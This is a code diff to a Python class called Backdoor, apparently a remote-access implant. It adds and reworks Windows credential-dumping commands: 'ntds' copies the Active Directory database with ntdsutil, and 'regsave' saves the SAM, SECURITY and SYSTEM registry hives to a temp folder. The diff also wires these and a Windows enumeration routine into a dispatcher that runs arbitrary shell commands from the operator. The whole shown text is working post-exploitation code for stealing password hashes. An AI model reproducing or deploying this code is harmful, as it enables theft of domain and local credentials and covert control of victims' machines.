@@ -213,23 +213,49 @@ class Backdoor:
         else:
             return "[!] target is not a windows machine [!]"
 
-    def hash_dump(self):
+    def ntds(self):
         if os_type == 'windows':
-            try:
-                shutil.rmtree("C:\Windows\Temp\copy-ntds")
-                subprocess.call('ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\copy-ntds" quit quit',shell=True)
-
-                return "[+] dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds [+]"
-            except:
+            is_admin =  str(ctypes.windll.shell32.IsUserAnAdmin())
+            if is_admin == '1':
                 try:
-                    subprocess.call('reg save hklm\sam c:\sam.save',shell=True)
-                    subprocess.call('reg save hklm\security c:\security.save',shell=True)
-                    subprocess.call('reg save hklm\system c:\system.save',shell=True)
-                    return "[+] dumped using reg save, saved in c:\\sam.save, system.save , security.save [+]"
+                    shutil.rmtree("C:\Windows\Temp\copy-ntds")
+                    subprocess.call('ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\copy-ntds" quit quit',shell=True)
+                    return "[+] dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds [+]"
                 except:
                     return "[-] ntds dump failed [-]"
+            else:
+                return "[+] permission denied, your not running as admin [+]"
         else:
             return "[!] target is not a windows machine [!]"
+
+    def reg_save(self):
+        if os_type == 'windows':
+            is_admin =  str(ctypes.windll.shell32.IsUserAnAdmin())
+            if is_admin == '1':
+                try:
+                    self.rm_file('C:\Windows\Temp\sam.save')
+                except:
+                    pass
+                try:
+                    self.rm_file('C:\Windows\Temp\security.save')
+                except:
+                    pass
+                try:
+                    self.rm_file('C:\Windows\Temp\system.save')
+                except:
+                    pass
+                try:
+                    subprocess.call('reg save hklm\sam C:\Windows\Temp\sam.save',shell=True)
+                    subprocess.call('reg save hklm\security C:\Windows\Temp\security.save',shell=True)
+                    subprocess.call('reg save hklm\system C:\Windows\Temp\system.save',shell=True)
+                    return "[+] dumped using reg save, saved in C:\Windows\Temp\sam.save, system.save , security.save [+]"
+                except:
+                    return "[-] reg-save dump failed [-]"
+            else:
+                return "[+] permission denied, your not running as admin [+]"
+        else:
+            return "[+] permission denied, your not running as admin [+]"
+
 
 # post exploitation enumeration function for linux............................................................................
     def linux_enum(self):
@@ -381,8 +407,10 @@ class Backdoor:
                 self.fork()
             elif cmd[0] == 'fw' and len(cmd) == 4 :
                 result=self.firewall(cmd[1],cmd[2],cmd[3])
-            elif cmd[0] == "hashdump":
-                result = self.hash_dump()
+            elif cmd[0] == "ntds":
+                result = self.ntds()
+            elif cmd[0] == "regsave":
+                result = self.reg_save()
             elif cmd[0] == "powershell":
                 result=self.powershell(cmd[1])
             elif cmd[0] == "enum":
@@ -390,9 +418,8 @@ class Backdoor:
                     self.linux_enum()
                     result = self.read_file('/tmp/enum.txt')
                 else:
-                    #self.windows_enum()
-                    #result = self.read_file('/tmp/enum.txt')
-                    result = "on my todo list :)"
+                    self.windows_enum()
+                    result = self.read_file('/tmp/enum.txt')
             elif len(cmd) > 0:
                 try:
                     cmd = ' '.join(cmd[0:])
